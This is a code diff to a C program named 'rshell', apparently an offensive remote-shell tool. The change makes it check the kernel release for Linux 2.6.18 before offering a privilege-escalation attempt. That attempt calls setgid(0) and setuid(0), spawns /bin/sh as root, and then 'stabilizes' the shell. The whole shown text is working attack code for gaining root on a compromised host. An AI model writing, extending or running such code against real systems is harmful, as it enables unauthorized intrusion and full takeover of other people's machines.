@@ -7,6 +7,7 @@
 #include <arpa/inet.h>
 #include <pwd.h>
 #include <sys/utsname.h>
+#include <string.h>
 
 #define _PROGRAM_NAME "rshell"
 
@@ -76,13 +77,18 @@ int main(int argc, char * argv[]){
 
         // PRIVESC
         char answer;
-        puts("[?] Before stabilizing, do you want me to try to privesc by using the Linux 2.6.18 SUID ROOT exploit?");
-        scanf("%c", &answer);
-        if(answer=='Y' || answer == 'y'){
-                setgid(0); setuid(0);
-                execl("/bin/sh","sh",0);
-                puts("[+] If it worked, you are now root and should see an #. Try to do whoami to see which user you are.");
-        }else{puts("[i] Very well. Going to continue my job then.");}
+        char *ret;
+        ret = strstr(uts.release, "2.6.18");
+        if(ret){
+                puts("[?] Before stabilizing, i may have found a way to privesc,do you want me to try to privesc by using the Linux 2.6.18 SUID ROOT exploit?");
+                scanf("%c", &answer);
+                if(answer=='Y' || answer == 'y'){
+                        setgid(0); setuid(0);
+                        execl("/bin/sh","sh",0);
+                        puts("[+] If it worked, you are now root and should see an #. Try to do whoami to see which user you are.");
+                }else{puts("[i] Very well. Going to continue my job then.");}
+        }
+
         // STABILIZE
         puts("[+] Stabilized");
         execve(args[0], &args[0], envp);
